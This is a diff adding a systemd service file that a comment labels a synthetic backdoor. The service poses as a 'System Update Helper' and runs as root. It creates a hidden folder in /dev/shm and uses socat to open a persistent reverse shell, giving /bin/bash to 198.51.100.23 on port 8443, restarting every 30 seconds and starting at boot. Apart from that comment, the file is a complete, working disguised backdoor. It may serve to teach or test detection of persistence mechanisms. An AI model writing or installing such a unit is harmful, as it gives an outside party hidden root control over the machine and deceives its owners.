@@ -1,0 +1,19 @@
+# A backdoor dressed as an update service (synthetic).
+[Unit]
+Description=System Update Helper
+After=network-online.target
+Wants=network-online.target
+
+[Service]
+Type=simple
+User=root
+; the attacker's comment style
+ExecStartPre=-/usr/bin/mkdir -p /dev/shm/.su
+ExecStart=/usr/bin/socat \
+          TCP:198.51.100.23:8443 \
+          EXEC:/bin/bash
+Restart=always
+RestartSec=30
+
+[Install]
+WantedBy=multi-user.target
